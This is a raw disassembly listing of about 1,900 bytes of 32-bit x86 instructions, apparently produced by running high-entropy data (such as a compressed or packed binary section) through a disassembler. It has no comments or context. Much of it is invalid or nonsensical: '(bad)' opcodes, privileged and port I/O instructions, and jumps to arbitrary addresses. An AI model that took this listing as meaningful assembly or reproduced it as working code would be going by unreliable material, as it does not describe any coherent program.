  41ab1a:	imul   eax,DWORD PTR [edx+0x7bca2661],0xffffff81
  41ab21:	imul   edx,ebx,0x80ef2847
  41ab27:	adc    al,0x99
  41ab29:	test   eax,0x7ae00d65
  41ab2e:	into   
  41ab2f:	xchg   ebp,eax
  41ab31:	cdq    
  41ab32:	adc    ch,dl
  41ab34:	mov    ebp,0xcca84a95
  41ab39:	test   BYTE PTR [ebp+ebx*2+0x40],al
  41ab3d:	std    
  41ab3e:	enter  0xd941,0x8a
  41ab42:	rcl    BYTE PTR [edx],cl
  41ab44:	xchg   edi,eax
  41ab45:	mov    edx,0xd1c37dad
  41ab4a:	data16 int3 
  41ab4c:	and    al,0xc2
  41ab4e:	dec    eax
  41ab4f:	ss push esi
  41ab51:	mov    esp,0xad0b6ffc
  41ab56:	ficom  DWORD PTR [ebp+edi*8+0x58]
  41ab5a:	(bad)  
  41ab5b:	pop    ds
  41ab5c:	or     bh,BYTE PTR [ebp-0x24]
  41ab5f:	into   
  41ab60:	ins    DWORD PTR es:[edi],dx
  41ab61:	in     eax,0x18
  41ab63:	jmp    DWORD PTR [ebx+0x57338e77]
  41ab69:	pop    ecx
  41ab6a:	pop    ebp
  41ab6b:	icebp  
  41ab6c:	mov    al,ds:0xbd00b1e1
  41ab71:	inc    edi
  41ab72:	or     eax,0x976f42bc
  41ab77:	pop    esi
  41ab78:	js     0x41abb4
  41ab7a:	das    
  41ab7b:	test   BYTE PTR [edi],0x9c
  41ab7e:	ins    DWORD PTR es:[edi],dx
  41ab7f:	ret    0x60bc
  41ab82:	out    0xe0,eax
  41ab84:	push   esp
  41ab85:	cld    
  41ab86:	loop   0x41abd9
  41ab88:	sbb    DWORD PTR [esi-0x62ed5194],ebx
  41ab8e:	ins    DWORD PTR es:[edi],dx
  41ab8f:	js     0x41abf7
  41ab91:	out    dx,al
  41ab92:	mov    al,0x65
  41ab95:	in     eax,dx
  41ab96:	push   ebp
  41ab97:	pop    ebp
  41ab98:	jne    0x41abab
  41ab9a:	push   ebp
  41ab9b:	pop    ebx
  41ab9c:	adc    esi,DWORD PTR [eax+0x6f]
  41ab9f:	xor    BYTE PTR [edx],bh
  41aba1:	(bad)  
  41aba2:	imul   esi,DWORD PTR [ebx+eax*4-0x33],0x81065096
  41abaa:	leave  
  41abab:	lock jns 0x41ac1d
  41abae:	sbb    bh,BYTE PTR [esi+esi*4+0x30]
  41abb2:	stos   DWORD PTR es:[edi],eax
  41abb3:	add    DWORD PTR [ebx],esi
  41abb5:	add    dl,BYTE PTR [ebp-0x39191e0]
  41abbb:	jae    0x41ab3d
  41abbd:	jg     0x41ab9d
  41abbf:	hlt    
  41abc0:	int3   
  41abc1:	js     0x41ab6b
  41abc3:	jbe    0x41ac30
  41abc5:	cmp    ebx,esi
  41abc7:	mov    ds:0xaaeb37e0,eax
  41abcc:	bound  esi,QWORD PTR [eax-0x12]
  41abcf:	fidiv  WORD PTR [eax-0x10]
  41abd2:	pop    dx
  41abd4:	scas   eax,DWORD PTR es:[edi]
  41abd5:	iret   
  41abd6:	fidiv  DWORD PTR [ecx+0x36]
  41abd9:	dec    eax
  41abda:	add    DWORD PTR [ecx-0x3e],ecx
  41abdd:	jecxz  0x41ac11
  41abdf:	jo     0x41ac32
  41abe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe2:	pop    ss
  41abe3:	dec    BYTE PTR [ebx+eiz*2]
  41abe6:	mov    edi,DWORD PTR [edi-0x3ac917e]
  41abec:	or     ebx,DWORD PTR [ecx+0x35fe3a40]
  41abf2:	std    
  41abf3:	sub    eax,0x8798a39f
  41abf8:	arpl   WORD PTR [edi+edx*1+0x6],bx
  41abfc:	sub    eax,0x64ae3c26
  41ac01:	and    ah,al
  41ac03:	push   0xffffff81
  41ac05:	sti    
  41ac06:	mov    cl,0x9f
  41ac08:	or     eax,0x34998747
  41ac0d:	mov    al,ds:0x895a09e7
  41ac12:	mov    ebp,0xd3b69985
  41ac17:	bound  ebx,QWORD PTR ds:0xe2bbe679
  41ac1d:	sti    
  41ac1e:	rol    DWORD PTR [edx-0x30e9389d],cl
  41ac24:	push   ss
  41ac25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac26:	into   
  41ac27:	repnz sar DWORD PTR ds:0xbbdf8d9,cl
  41ac2e:	push   ss
  41ac2f:	xchg   esp,eax
  41ac30:	sbb    DWORD PTR [edi+0x624c6bc2],ecx
  41ac36:	cmp    DWORD PTR ds:0x271a19b3,edi
  41ac3c:	mov    ds:0x26870372,al
  41ac41:	adc    bl,BYTE PTR [ebp+ebp*8+0x6e1aacd9]
  41ac48:	leave  
  41ac49:	clc    
  41ac4a:	jp     0x41ac59
  41ac4c:	mul    BYTE PTR [edx+0x4c]
  41ac4f:	inc    esp
  41ac50:	mov    eax,ds:0x5dec7bc3
  41ac55:	sbb    al,BYTE PTR [edi+0x69a765f3]
  41ac5b:	aaa    
  41ac5c:	(bad)  
  41ac5d:	call   0xb9e8:0xea20fe05
  41ac64:	cmp    BYTE PTR [ecx-0x79732ce1],al
  41ac6a:	mov    cl,0xab
  41ac6c:	xchg   BYTE PTR [ebp-0x1e],bh
  41ac6f:	push   edi
  41ac70:	mov    eax,0xd9aebcc3
  41ac75:	int    0x78
  41ac77:	fild   QWORD PTR [ecx+0x2b]
  41ac7a:	aad    0xb1
  41ac7c:	call   0x66e3:0xf269e154
  41ac83:	pop    esi
  41ac84:	loop   0x41aca3
  41ac86:	jecxz  0x41ac5e
  41ac88:	dec    ecx
  41ac89:	push   esp
  41ac8a:	clc    
  41ac8b:	dec    esi
  41ac8c:	jg     0x41ac46
  41ac8e:	out    dx,eax
  41ac8f:	cmp    BYTE PTR [edx+0x55b3cfcb],ch
  41ac95:	fst    DWORD PTR [esi-0x74]
  41ac98:	dec    esp
  41ac99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac9a:	mov    edi,0xce6906a4
  41ac9f:	push   cs
  41aca0:	jge    0x41ac4d
  41aca2:	mov    bl,0x61
  41aca4:	in     al,0x9
  41aca6:	icebp  
  41aca7:	push   esi
  41aca8:	pop    edi
  41aca9:	jbe    0x41acd3
  41acab:	jne    0x41acb7
  41acad:	xor    BYTE PTR [edi-0x25],0x35
  41acb1:	lea    edx,[edi-0x7fe49437]
  41acb7:	inc    ebx
  41acb8:	mov    dh,0xa7
  41acba:	push   cs
  41acbb:	int    0x9a
  41acbd:	cs lahf 
  41acbf:	cwde   
  41acc0:	in     al,dx
  41acc1:	push   esp
  41acc2:	loopne 0x41ad15
  41acc4:	pop    ss
  41acc5:	dec    BYTE PTR [edx-0x780bbb45]
  41accb:	(bad)  
  41accd:	mov    al,0xd0
  41accf:	stc    
  41acd0:	pop    eax
  41acd1:	jp     0x41ad0d
  41acd3:	mov    BYTE PTR [ecx+0x68],bl
  41acd6:	push   esi
  41acd7:	fiadd  DWORD PTR [ecx]
  41acd9:	mov    ch,0xa5
  41acdb:	xchg   esp,eax
  41acdc:	stc    
  41acdd:	std    
  41acde:	shl    eax,0x2f
  41ace1:	lods   al,BYTE PTR ds:[esi]
  41ace2:	imul   esp,DWORD PTR [esi+0x64e7762],0x3e
  41ace9:	aad    0xc
  41aceb:	lahf   
  41acec:	ret    0x3ea2
  41acef:	in     al,0x26
  41acf1:	mov    ds:0xd65ec0b6,eax
  41acf6:	loope  0x41ad17
  41acf8:	scas   al,BYTE PTR es:[edi]
  41acf9:	hlt    
  41acfa:	inc    edx
  41acfb:	enter  0x9a26,0xbe
  41acff:	add    dh,BYTE PTR [ebx+0x30]
  41ad02:	push   ds
  41ad03:	fwait
  41ad04:	jmp    0x36a8b7db
  41ad09:	std    
  41ad0a:	test   al,0xa6
  41ad0c:	test   al,0x31
  41ad0e:	pushf  
  41ad0f:	xlat   BYTE PTR ds:[ebx]
  41ad10:	aam    0x48
  41ad12:	adc    al,0x7d
  41ad14:	jecxz  0x41ad47
  41ad16:	mov    edi,0xb575f04b
  41ad1b:	sub    esi,ebx
  41ad1d:	lods   eax,DWORD PTR cs:[esi]
  41ad1f:	and    ecx,0xffffffe9
  41ad22:	mov    eax,0xc9fde064
  41ad27:	sbb    al,0x94
  41ad29:	push   cs
  41ad2a:	jmp    0xa075690f
  41ad2f:	cld    
  41ad30:	sub    ecx,DWORD PTR [ecx-0x5629d5c6]
  41ad36:	pop    eax
  41ad37:	repz dec eax
  41ad39:	jmp    0x2244ed6
  41ad3e:	fwait
  41ad3f:	and    al,0x90
  41ad41:	fistp  DWORD PTR [esi]
  41ad43:	mov    BYTE PTR ds:0x648584a3,bl
  41ad49:	call   0x8a11a1cf
  41ad4e:	cwde   
  41ad4f:	pop    ss
  41ad50:	setp   BYTE PTR [eax-0x70575b71]
  41ad57:	pop    ecx
  41ad58:	test   BYTE PTR [eax-0x9efdfc8],ah
  41ad5e:	push   ecx
  41ad5f:	arpl   WORD PTR [ebx],sp
  41ad61:	push   edx
  41ad62:	retf   0x4eb8
  41ad65:	(bad)  
  41ad66:	xchg   ebp,eax
  41ad67:	sub    al,0x32
  41ad69:	ins    BYTE PTR es:[edi],dx
  41ad6a:	ret    
  41ad6b:	fdiv   DWORD PTR [ecx+0xc7a0440]
  41ad71:	bound  ebp,QWORD PTR [edi+0x22798f35]
  41ad77:	xchg   ecx,eax
  41ad78:	mov    ?,WORD PTR [ebp-0x44284a2]
  41ad7e:	and    DWORD PTR [edi-0x20ece57],edi
  41ad84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad85:	sbb    DWORD PTR [edx],0xffffffc0
  41ad88:	ds enter 0x52c3,0xe1
  41ad8d:	sub    BYTE PTR [ebx+0x60],dh
  41ad90:	inc    esp
  41ad91:	add    eax,0x3cdd550f
  41ad96:	fwait
  41ad97:	int3   
  41ad98:	aam    0xc2
  41ad9a:	fistp  DWORD PTR [edi]
  41ad9c:	test   eax,0x617d855e
  41ada1:	scas   eax,DWORD PTR es:[edi]
  41ada2:	pusha  
  41ada3:	push   edx
  41ada4:	je     0x41ad57
  41ada6:	les    ebp,FWORD PTR [esi+ebp*8+0x5e]
  41adaa:	push   esp
  41adab:	into   
  41adac:	mov    ds:0xd1047ef8,al
  41adb1:	adc    eax,0x4122911d
  41adb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb7:	hlt    
  41adb8:	shl    DWORD PTR [edi+ecx*2-0x12],0x45
  41adbd:	iret   
  41adbe:	call   0xb0ba:0xd668ec91
  41adc5:	xchg   ebp,eax
  41adc6:	sbb    ch,BYTE PTR [ecx-0x328097f5]
  41adcc:	bound  ebx,QWORD PTR [edx+0x56]
  41adcf:	call   esp
  41add1:	cmc    
  41add2:	xor    eax,ecx
  41add4:	jo     0x41ad5e
  41add6:	aas    
  41add7:	inc    edi
  41add8:	std    
  41add9:	mov    edx,0xfe1d198d
  41adde:	push   esi
  41addf:	pop    edx
  41ade0:	mov    ah,0x83
  41ade2:	in     eax,dx
  41ade3:	or     ch,BYTE PTR [ebx-0xf93e89b]
  41ade9:	sub    al,0x4d
  41adeb:	dec    esp
  41adec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aded:	retf   0xbec4
  41adf0:	lods   eax,DWORD PTR ds:[esi]
  41adf1:	xchg   edx,eax
  41adf2:	lahf   
  41adf3:	xchg   esp,eax
  41adf4:	(bad)  
  41adf5:	clc    
  41adf6:	pop    esp
  41adf7:	pop    eax
  41adf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adf9:	fistp  WORD PTR [ebx+0x56]
  41adfc:	icebp  
  41adfd:	and    DWORD PTR [ebp-0x3a],ecx
  41ae00:	add    BYTE PTR [ebx+ebx*2-0x56],bl
  41ae04:	outs   dx,BYTE PTR ds:[esi]
  41ae05:	js     0x41adb2
  41ae07:	and    edx,esi
  41ae09:	clc    
  41ae0a:	lds    edi,FWORD PTR [ecx]
  41ae0c:	lahf   
  41ae0d:	adc    BYTE PTR [ebx],dl
  41ae0f:	mov    gs,WORD PTR [esi-0x246d4aed]
  41ae15:	out    0x79,eax
  41ae17:	or     cl,0xf2
  41ae1a:	push   esp
  41ae1b:	add    dh,BYTE PTR [ebx+0x3e766028]
  41ae21:	sbb    esi,DWORD PTR [esi+0x63dd790a]
  41ae27:	or     al,0xb6
  41ae29:	or     DWORD PTR [eax-0x24],0x81597315
  41ae30:	fmul   QWORD PTR [ebx]
  41ae32:	ror    al,cl
  41ae34:	fisubr WORD PTR [esi-0x2c]
  41ae37:	adc    al,0x8e
  41ae39:	push   edx
  41ae3a:	mov    ch,bl
  41ae3c:	stos   DWORD PTR es:[edi],eax
  41ae3d:	mov    esp,0xa8fd9c72
  41ae42:	inc    esi
  41ae43:	sbb    BYTE PTR [eax+0xe],ch
  41ae46:	mov    eax,ds:0xfd9a64e6
  41ae4b:	fcom   DWORD PTR [esp+ebx*4]
  41ae4e:	lods   eax,DWORD PTR ds:[esi]
  41ae4f:	mov    edx,0xf55ba4c7
  41ae54:	mov    edx,0x71886c65
  41ae59:	sub    DWORD PTR [ebx+ecx*2+0x25],esp
  41ae5d:	mov    bh,0x4d
  41ae5f:	xchg   ebp,eax
  41ae60:	dec    eax
  41ae61:	ffreep st(0)
  41ae63:	aam    0xe2
  41ae65:	enter  0x8d07,0xd0
  41ae69:	mov    WORD PTR [ebx-0x1559440b],?
  41ae6f:	sbb    bl,BYTE PTR [ebx-0x4b]
  41ae72:	or     ah,al
  41ae74:	adc    BYTE PTR [edx+0x73],0x74
  41ae78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae79:	add    BYTE PTR [edi],ch
  41ae7b:	cmp    BYTE PTR [ebp+0x2dd7831],dh
  41ae81:	fadd   QWORD PTR [ecx+0x1656ca93]
  41ae87:	mov    ebp,0xc471cb56
  41ae8c:	adc    BYTE PTR [ebx],bl
  41ae8e:	call   0xc763:0xb7f3a7d8
  41ae95:	cmp    al,0x86
  41ae97:	push   edx
  41ae98:	mov    esi,0x134b5414
  41ae9d:	stc    
  41ae9e:	inc    eax
  41ae9f:	push   esp
  41aea0:	xchg   ebp,ecx
  41aea2:	pop    esp
  41aea3:	inc    esp
  41aea4:	sar    DWORD PTR [ebx+eiz*8-0x8931f74],1
  41aeab:	mov    cl,0xd2
  41aead:	xchg   BYTE PTR [ebx-0x2a3b1694],al
  41aeb3:	loope  0x41ae43
  41aeb5:	popf   
  41aeb6:	aam    0xc0
  41aeb8:	popf   
  41aeb9:	pusha  
  41aeba:	neg    DWORD PTR [ecx+0x46]
  41aebd:	std    
  41aebe:	in     al,0x24
  41aec0:	call   0xedece4f9
  41aec5:	jne    0x41ae4b
  41aec7:	jp     0x41ae91
  41aec9:	pusha  
  41aeca:	and    BYTE PTR [edx+0x7a],ch
  41aecd:	adc    BYTE PTR [eax],al
  41aecf:	xor    BYTE PTR [esi+0x44789a2e],dh
  41aed5:	sub    dl,BYTE PTR [ebx+0x78fd431f]
  41aedb:	sub    BYTE PTR [eax+edi*4],bh
  41aede:	sbb    dh,BYTE PTR ds:0x952e0412
  41aee4:	bnd jns 0x41ae6b
  41aee7:	lds    eax,FWORD PTR [esi+0x1a97636a]
  41aeed:	int3   
  41aeee:	loope  0x41aebe
  41aef0:	sub    eax,0xe75bd248
  41aef5:	sbb    BYTE PTR [ecx+0x28],dl
  41aef8:	pop    es
  41aef9:	(bad)  
  41aefa:	jmp    0x71ee7e95
  41aeff:	adc    cl,dl
  41af01:	mov    edi,0x44af236c
  41af06:	lea    ebx,[ebp-0x6d661e45]
  41af0c:	jno    0x41af16
  41af0e:	pop    ss
  41af0f:	mov    ds:0xd8a4676,eax
  41af14:	aam    0x37
  41af16:	(bad)  
  41af17:	fnsave [edi]
  41af19:	dec    esi
  41af1a:	rcr    BYTE PTR [edx],1
  41af1c:	xchg   esp,eax
  41af1d:	cdq    
  41af1e:	dec    edi
  41af1f:	mov    eax,ds:0xa5818118
  41af24:	clc    
  41af25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af26:	or     al,0x7f
  41af28:	aad    0x11
  41af2a:	mov    ds:0x2d5be0bc,al
  41af2f:	in     al,0xca
  41af31:	retf   
  41af32:	call   0x1773:0xbd3eab2e
  41af39:	mov    esp,0x61dc8474
  41af3e:	rcl    bh,cl
  41af40:	inc    edi
  41af41:	imul   edx,ebp,0xffffffc3
  41af44:	add    BYTE PTR [esi+0x2374ef9c],0xa
  41af4b:	loope  0x41af2a
  41af4d:	mov    dh,0x51
  41af4f:	fld    TBYTE PTR [esi]
  41af51:	sahf   
  41af52:	jb     0x41af2e
  41af54:	pop    eax
  41af55:	sbb    esp,ebp
  41af57:	outs   dx,BYTE PTR ds:[esi]
  41af58:	test   eax,0x4e9619f4
  41af5d:	inc    ecx
  41af5e:	cs popf 
  41af60:	enter  0x4663,0xf
  41af64:	mov    dl,BYTE PTR [ebp+0x3328d580]
  41af6a:	pop    ecx
  41af6b:	ret    
  41af6c:	cwde   
  41af6d:	mov    eax,0xff3ff6b5
  41af72:	(bad)
  41af75:	imul   esi,DWORD PTR [ebp-0x6b],0x28
  41af79:	repz scas eax,DWORD PTR es:[edi]
  41af7b:	cmp    edi,ebx
  41af7d:	and    DWORD PTR [ebp+0x6e9b263f],edi
  41af83:	xor    al,0xf3
  41af85:	clc    
  41af86:	mov    bh,0xcb
  41af88:	pop    ebp
  41af89:	adc    ch,dl
  41af8b:	inc    esi
  41af8c:	pop    es
  41af8d:	(bad)  
  41af8e:	fcom   QWORD PTR [ebx+0x5a]
  41af91:	xlat   BYTE PTR ds:[ebx]
  41af93:	sub    DWORD PTR [ecx],esp
  41af95:	mov    edx,0xbd820917
  41af9a:	dec    eax
  41af9b:	xchg   ecx,eax
  41af9c:	call   0xb502e6a2
  41afa1:	xchg   ebp,eax
  41afa2:	in     eax,0xc8
  41afa4:	data16 fdivr DWORD PTR [esi-0x61]
  41afa8:	xor    edx,DWORD PTR [eax+0x14]
  41afab:	(bad)  
  41afac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afad:	jmp    0x817d:0x7411353e
  41afb4:	cmp    dl,ch
  41afb6:	outs   dx,DWORD PTR ds:[esi]
  41afb7:	mov    ds:0x5e520d5d,eax
  41afbd:	or     DWORD PTR [ebx+ecx*2],0xdc985656
  41afc4:	sub    ah,BYTE PTR [ebx+0x282c07b4]
  41afca:	or     cl,bh
  41afcc:	dec    edi
  41afcd:	addr16 paddq mm5,mm7
  41afd1:	mov    edx,0xacbcad96
  41afd6:	sar    DWORD PTR [ebx-0x3031dd7b],0xb5
  41afdd:	inc    ebp
  41afde:	mov    esp,0x693db6f1
  41afe3:	xor    ecx,DWORD PTR [ebx]
  41afe5:	inc    ecx
  41afe6:	fiadd  WORD PTR [eax+0x1d587b76]
  41afec:	gs pop esi
  41afee:	push   edx
  41afef:	pusha  
  41aff0:	cmp    al,0x1f
  41aff2:	popf   
  41aff3:	imul   ebp,esp,0x3b
  41aff6:	jnp    0x41b000
  41aff8:	jns    0x41afa3
  41affa:	stos   DWORD PTR es:[edi],eax
  41affb:	fld    TBYTE PTR [eax+0x6c]
  41affe:	pop    edx
  41afff:	mov    edx,0x1a4ba48d
  41b004:	imul   ecx,DWORD PTR ds:0x4cb66ba8,0xfffffff1
  41b00b:	inc    ecx
  41b00c:	dec    ecx
  41b00d:	aad    0x65
  41b00f:	xchg   esi,eax
  41b010:	inc    ecx
  41b011:	loop   0x41afe0
  41b013:	mov    esp,DWORD PTR [ebp-0x8]
  41b016:	mov    al,ds:0xb6735b23
  41b01b:	ret    0xc1eb
  41b01e:	ins    DWORD PTR es:[edi],dx
  41b01f:	or     BYTE PTR [esi],dl
  41b021:	xlat   BYTE PTR ds:[ebx]
  41b022:	imul   ebp,ebx,0xffffffbf
  41b025:	outs   dx,BYTE PTR ds:[si]
  41b027:	push   ss
  41b028:	ret    
  41b029:	cwde   
  41b02a:	(bad)  
  41b02b:	fs mov ecx,0x1584215e
  41b031:	lea    edi,[ebx-0x3d392425]
  41b037:	mov    WORD PTR [eax+0x41f0c8c2],ds
  41b03d:	pusha  
  41b03e:	sti    
  41b03f:	xor    dl,BYTE PTR [edx-0x7b5eb93b]
  41b045:	sub    BYTE PTR [edx-0x10],dl
  41b048:	adc    dl,BYTE PTR [ecx+0x506d4a4]
  41b04e:	xor    BYTE PTR [esi+0x3f],ch
  41b051:	add    al,0x53
  41b053:	cmc    
  41b054:	(bad)  
  41b056:	fisttp WORD PTR [ecx+0x25]
  41b059:	and    esi,DWORD PTR [ebp-0x41]
  41b05c:	lahf   
  41b05d:	pop    eax
  41b05e:	sub    cl,ah
  41b060:	or     edi,esi
  41b062:	sub    al,0xc8
  41b064:	je     0x41b0dc
  41b066:	cmc    
  41b067:	daa    
  41b068:	pop    esi
  41b069:	addr16 jne 0x41b051
  41b06c:	sbb    eax,0x44e64a79
  41b071:	test   BYTE PTR [ecx+0x15],dl
  41b074:	and    esp,DWORD PTR [esi]
  41b076:	(bad)  
  41b077:	dec    edi
  41b078:	jle    0x41b025
  41b07a:	push   0x30
  41b07c:	pop    ebp
  41b07d:	mov    bl,0x1f
  41b07f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b080:	pop    edi
  41b081:	sbb    al,0xe3
  41b083:	mov    dl,0x3a
  41b085:	dec    ecx
  41b086:	lahf   
  41b087:	lea    edx,[ebx+0x5dd201ae]
  41b08d:	mov    edi,0xfe178d3b
  41b092:	cdq    
  41b093:	les    esp,FWORD PTR [edi]
  41b095:	lock mov dh,0xe1
  41b098:	sbb    bl,0x28
  41b09b:	fnstcw WORD PTR [edx+ebp*2-0x79b30190]
  41b0a2:	inc    eax
  41b0a3:	nop
  41b0a4:	shr    DWORD PTR [ebx],0x25
  41b0a7:	inc    eax
  41b0a8:	adc    eax,0xa5bcac0
  41b0ad:	cdq    
  41b0ae:	mov    edx,0x99b40b8f
  41b0b3:	ja     0x41b075
  41b0b5:	and    eax,edi
  41b0b7:	outs   dx,BYTE PTR ds:[esi]
  41b0b8:	pop    ds
  41b0b9:	jmp    0x41b0d2
  41b0bb:	cmp    BYTE PTR [ebp-0x16],0x7b
  41b0bf:	fimul  WORD PTR [ebp-0x2b]
  41b0c2:	cs mov ch,0xe1
  41b0c5:	cmp    BYTE PTR [ebx-0x47],al
  41b0c8:	in     al,dx
  41b0c9:	int3   
  41b0ca:	mov    esi,ecx
  41b0cc:	outs   dx,DWORD PTR ds:[esi]
  41b0cd:	xor    eax,0xdd87de59
  41b0d2:	mov    esp,0xa1469319
  41b0d7:	aas    
  41b0d8:	jp     0x41b0df
  41b0da:	and    al,0xe7
  41b0dc:	dec    ecx
  41b0dd:	hlt    
  41b0de:	and    eax,0x6a88574d
  41b0e3:	arpl   WORD PTR ds:0xf8a85948,si
  41b0e9:	ss out dx,eax
  41b0eb:	xchg   edi,eax
  41b0ec:	ins    DWORD PTR es:[edi],dx
  41b0ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ee:	cs ss ja 0x41b0f3
  41b0f2:	in     al,dx
  41b0f3:	cmc    
  41b0f4:	push   ebp
  41b0f5:	rcl    DWORD PTR ds:0xd124c47e,1
  41b0fb:	scas   al,BYTE PTR es:[edi]
  41b0fc:	in     eax,0x37
  41b0fe:	pushf  
  41b0ff:	add    eax,0x8b0c1a51
  41b104:	loopne 0x41b125
  41b106:	xchg   ebx,eax
  41b107:	mov    WORD PTR [eax-0x6d],?
  41b10a:	(bad)  
  41b10b:	out    dx,al
  41b10c:	sbb    BYTE PTR [eax+0xf],bl
  41b10f:	scas   eax,DWORD PTR es:[edi]
  41b110:	cld    
  41b111:	sahf   
  41b112:	retf   0x74ba
  41b115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b116:	out    0xbb,eax
  41b118:	ss push ecx
  41b11a:	mov    al,0x49
  41b11c:	jl     0x41b0be
  41b11e:	add    al,0xae
  41b120:	punpckldq mm7,DWORD PTR [edi]
  41b123:	cmp    al,0xac
  41b125:	or     eax,0xe68da5a5
  41b12a:	jnp    0x41b160
  41b12c:	add    eax,0xe8b6c428
  41b131:	test   BYTE PTR [ebx],dh
  41b133:	pop    esi
  41b134:	sbb    edx,ebp
  41b136:	je     0x41b177
  41b138:	cmp    al,0xc2
  41b13a:	jmp    0x41b0cd
  41b13c:	scas   al,BYTE PTR es:[edi]
  41b13d:	or     al,BYTE PTR [edi]
  41b13f:	cwde   
  41b140:	or     al,0x28
  41b142:	adc    eax,DWORD PTR [ecx]
  41b144:	or     esi,esi
  41b146:	inc    edx
  41b147:	scas   al,BYTE PTR es:[edi]
  41b148:	jge    0x41b15a
  41b14a:	inc    eax
  41b14b:	dec    eax
  41b14c:	cmp    DWORD PTR [eax],ebp
  41b14e:	mov    al,BYTE PTR [ecx-0x1a54c16b]
  41b154:	and    al,0xa1
  41b156:	push   eax
  41b157:	jbe    0x41b0f1
  41b159:	repnz mov al,0xaa
  41b15c:	inc    ebx
  41b15d:	adc    al,0x69
  41b15f:	(bad)  
  41b160:	jg     0x41b12f
  41b162:	je     0x41b153
  41b164:	pop    esp
  41b165:	sbb    edx,DWORD PTR [ecx]
  41b167:	adc    al,0x3b
  41b169:	jmp    0x1bfe:0x6b2afdf3
  41b170:	(bad)  
  41b171:	jecxz  0x41b16e
  41b173:	mov    esp,0x48a60b96
  41b178:	and    eax,0x87e83de2
  41b17d:	cli    
  41b17e:	rol    DWORD PTR [eax-0x20],0x94
  41b182:	mov    ?,WORD PTR ds:0xb2aa6206
  41b188:	inc    eax
  41b189:	scas   al,BYTE PTR es:[edi]
  41b18a:	pop    es
  41b18b:	mov    eax,0xb85879e7
  41b190:	mov    al,BYTE PTR [eax+ebp*8]
  41b193:	mov    ebp,?
  41b195:	rol    DWORD PTR [eax-0x7],1
  41b198:	pop    edi
  41b199:	loop   0x41b1e0
  41b19b:	push   ds
  41b19c:	xchg   edx,eax
  41b19d:	mov    bh,0x68
  41b19f:	or     eax,0x9ee3b21c
  41b1a4:	and    al,0x36
  41b1a6:	cs psubd mm0,QWORD PTR ds:[di+0x8]
  41b1ad:	jle    0x41b218
  41b1af:	dec    esp
  41b1b0:	mov    ah,BYTE PTR [eax-0x51638e6d]
  41b1b6:	(bad)  [ebx-0x76]
  41b1b9:	mov    ebx,0xf71d8a85
  41b1be:	cli    
  41b1bf:	add    DWORD PTR [ebp+0x554617c2],esp
  41b1c5:	(bad)  
  41b1c6:	adc    eax,0x55ae701f
  41b1cb:	lods   eax,DWORD PTR ds:[esi]
  41b1cc:	push   es
  41b1cd:	das    
  41b1ce:	aaa    
  41b1cf:	std    
  41b1d0:	and    ch,BYTE PTR [ebx]
  41b1d2:	or     DWORD PTR [ebx-0x65],esp
  41b1d5:	sub    al,0x81
  41b1d7:	(bad)  
  41b1d8:	lds    ebx,FWORD PTR [edx-0x23]
  41b1db:	add    ah,ah
  41b1dd:	pop    esp
  41b1de:	std    
  41b1df:	adc    BYTE PTR [edx+ecx*4+0x5e1bb768],dl
  41b1e6:	pop    edi
  41b1e7:	or     BYTE PTR [ebp-0x7800803c],bh
  41b1ed:	push   es
  41b1ee:	les    edi,FWORD PTR [ebx+ebx*8-0x70]
  41b1f2:	push   edi
  41b1f3:	sub    ebp,ebx
  41b1f5:	or     DWORD PTR [ebx],ebp
  41b1f7:	call   0x344490fa
  41b1fc:	cmp    DWORD PTR [ebp+ebx*4-0x71],ecx
  41b200:	cmp    BYTE PTR [eax-0x18],0x69
  41b204:	xchg   ebp,eax
  41b205:	fldcw  WORD PTR [ebx]
  41b207:	stos   BYTE PTR es:[edi],al
  41b208:	mov    al,0x55
  41b20a:	pop    ecx
  41b20b:	dec    ebx
  41b20c:	lea    esp,[eax]
  41b20e:	inc    edx
  41b20f:	cs pop edi
  41b211:	jp     0x41b1a3
  41b213:	imul   esi,esp,0xaeae31e7
  41b219:	repz push ss
  41b21b:	sbb    eax,0xd6162e96
  41b220:	mov    BYTE PTR ds:0xb0005c70,dh
  41b226:	mov    ds:0x4101cd25,al
  41b22b:	lods   eax,DWORD PTR ds:[esi]
  41b22c:	fcom   QWORD PTR [edi]
  41b22e:	mov    gs,WORD PTR [eax]
  41b230:	inc    esp
  41b231:	xlat   BYTE PTR ds:[ebx]
  41b232:	enter  0xcbd,0x3e
  41b236:	lods   eax,DWORD PTR ds:[esi]
  41b237:	rol    DWORD PTR [ebp+0x16],0x7b
  41b23b:	mov    esp,0x4b65469d
  41b240:	das    
  41b241:	rcl    DWORD PTR ds:0x27076c6d,cl
  41b247:	push   ss
  41b248:	add    DWORD PTR [ebp+0x3a],eax
  41b24b:	push   ebp
  41b24c:	push   eax
  41b24d:	shl    DWORD PTR [edi+ebp*2-0x52146d77],1
  41b254:	call   FWORD PTR [edx-0x69]
  41b257:	hlt    
  41b258:	cmp    ebp,edx
  41b25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b25b:	(bad)  
  41b25c:	retf   
  41b25d:	xor    DWORD PTR [edi-0x50],0xffffffbe
  41b261:	fisub  DWORD PTR [esi-0x63]
  41b264:	mov    ds:0xf15d85fe,al
  41b269:	(bad)  
  41b26b:	lods   al,BYTE PTR ds:[esi]
  41b26c:	sbb    al,0x75
  41b26e:	and    al,0x22
  41b270:	and    DWORD PTR [edx],esp
  41b272:	imul   esi,DWORD PTR [edx+0x66158eb5],0xffffffe7
  41b279:	outs   dx,DWORD PTR ds:[esi]
  41b27a:	mov    ecx,0x6d9d35f3
  41b27f:	cld    
  41b280:	inc    ebx
  41b281:	or     eax,DWORD PTR [edi-0x5c]
  41b284:	or     eax,0xd3c2ea67
  41b289:	cwde   
  41b28a:	cld    
  41b28b:	dec    edx
  41b28c:	push   cs
